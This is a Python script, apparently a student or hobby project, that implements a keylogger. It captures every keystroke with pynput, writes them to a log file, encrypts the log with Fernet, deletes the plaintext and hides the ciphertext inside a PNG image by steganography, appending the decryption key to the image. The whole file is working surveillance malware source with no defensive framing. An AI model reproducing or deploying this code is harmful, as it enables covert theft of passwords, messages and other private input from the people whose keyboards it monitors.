import pynput
from pynput.keyboard import Key, Listener
import stepic
from PIL import Image
from cryptography.fernet import Fernet
import subprocess
import hashlib
import os
import shutil

count = 0
keys = []

def on_press(key):
    global keys, count

    keys.append(key)
    count += 1
    print("(0) pressed".format(key))

    if count >= 10:
        count = 0
        write_file(keys)
        keys = []

def write_file(keys):
    with open("log.txt", "a") as f:
        for key in keys:
            k = str(key). replace("'", "")
            if k.find("space") > 0:
                f.write('\n')
            elif k.find("Key") == -1:
                f.write(k)

def on_release(key):
    if key == Key.esc:

        keys = Fernet.generate_key()

        enc = Fernet(keys)


        with open("log.txt", "rb") as f:
            ftext = str(f.read())
            print(ftext)
            text_enc = enc.encrypt(ftext.encode())

        if os.path.exists("log.txt"):
            os.remove("log.txt")


        file_path = r"D:\project\ss.png"
        img = Image.open(file_path)
        img_stegano = stepic.encode(img, text_enc)

        if os.path.exists("ss.png"):
            os.remove("ss.png")

        img_stegano.save("ss.png")

        with open("ss.png", "ab") as t:
            t.write(keys)

        return False


with Listener(on_press = on_press, on_release = on_release) as listener:
    listener.join()


